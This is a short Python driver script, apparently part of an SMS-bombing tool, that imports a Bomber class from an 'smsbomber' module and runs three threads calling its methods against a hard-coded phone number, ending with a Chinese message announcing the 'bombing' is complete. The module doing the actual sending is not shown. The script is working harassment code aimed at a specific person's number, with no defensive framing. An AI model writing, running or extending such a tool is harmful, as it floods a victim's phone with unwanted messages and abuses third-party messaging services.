# encoding=utf-8
# attack.py
from smsbomber import Bomber
import threading

def attack1(phone):
    func = ['func%d' %i for i in range(0,10)]
    for i in func:
        if hasattr(Bomber,i):
            try:
                getattr(Bomber(phone),i)()
                print('%s has excuted!' %i)
            except:
                print('%s meet some problems!' %i)
                continue
        else:
            print('There is not %s' %i)

def attack2(phone):
    func = ['func%d' %i for i in range(5,15)]
    for i in func:
        if hasattr(Bomber,i):
            try:
                getattr(Bomber(phone),i)()
                print('%s has excuted!' %i)
            except:
                print('%s meet some problems!' %i)
                continue
        else:
            print('There is not %s' %i)

def attack3(phone):
    func = ['func%d' %i for i in range(10,20)]
    for i in func:
        if hasattr(Bomber,i):
            try:
                getattr(Bomber(phone),i)()
                print ('%s has excuted!' %i)
            except:
                print('%s meet some problems!' %i)
                continue
        else:
            print('There is not %s' %i)

phone = '18825453347'
thread1 = threading.Thread(target=attack1,name='thread1',args=(phone,))
thread2 = threading.Thread(target=attack2,name='thread2',args=(phone,))
thread3 = threading.Thread(target=attack3,name='thread3',args=(phone,))
threading.current_thread().name
thread1.start()
thread2.start()
thread3.start()
thread1.join()
thread2.join()
thread3.join()
print('已经轰炸完成!')